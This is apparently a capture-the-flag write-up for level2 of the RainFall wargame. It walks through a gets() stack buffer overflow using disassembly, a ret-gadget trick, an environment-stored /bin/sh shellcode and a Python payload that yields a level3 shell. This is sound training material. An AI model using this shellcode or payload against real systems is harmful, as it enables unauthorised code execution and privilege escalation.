# The target binary is vulnerable to a buffer overflow exploit.
#
# Similarly to the previous exercise, there is a call to gets :

Dump of assembler code for function p:
	0x080484d4 <+0>:	push   %ebp
	0x080484d5 <+1>:	mov    %esp,%ebp
	0x080484d7 <+3>:	sub    $0x68,%esp
	0x080484da <+6>:	mov    0x8049860,%eax
	0x080484df <+11>:	mov    %eax,(%esp)
	0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
	0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax <==
	0x080484ea <+22>:	mov    %eax,(%esp)
	0x080484ed <+25>:	call   0x80483c0 <gets@plt>

# As we can see, an address is loaded into eax at offset -0x4c(%ebp).
# This is equal to 76 in base 10. This means we need to override 80 bytes in
# order to reach the return address of the stack frame.

# Contrary to level1, there is a check made by the program to see if
# the return address could be on the stack :

	0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
	0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
	0x080484fb <+39>:	and    $0xb0000000,%eax
	0x08048500 <+44>:	cmp    $0xb0000000,%eax
	0x08048505 <+49>:	jne    0x8048527 <p+83>

	if (((int)ret & 0xb0000000) == 0xb0000000)

	0x08048507 <+51>:	mov    $0x8048620,%eax
	0x0804850c <+56>:	mov    -0xc(%ebp),%edx
	0x0804850f <+59>:	mov    %edx,0x4(%esp)
	0x08048513 <+63>:	mov    %eax,(%esp)
	0x08048516 <+66>:	call   0x80483a0 <printf@plt>
	0x0804851b <+71>:	movl   $0x1,(%esp)
	0x08048522 <+78>:	call   0x80483d0 <_exit@plt>

	{
		printf("(%p)\n", ret);
		_exit(1);
	}

# We can use a trick here and redirect to the address of the ret instruction in
# p, which will then pick-up the real return address on the stack.

	0x0804853e <+106>:	ret

# We now need some shellcode, which is easier to store in the environment :

	export SHELLCODE=$(python -c 'print 50 * "\x90" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

# We can get the address of the environment variable, by using a helper program 
# (see Resources for the source code) :

	level2@Rainfall:~$ /tmp/get_sc
	0xbffff897

# Now that we have everything, let's build the payload :

	level2@RainFall:~$ python -c "import struct;
	> ret = struct.pack('I', 0x804853e)
	> addr_sc = struct.pack('I', 0xbffff897)
	> print 'A' * 80 + ret + addr_sc" > /tmp/bad

# And finally :

	level2@RainFall:~$ cat /tmp/bad - | ./level2
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>����
	whoami
	level3
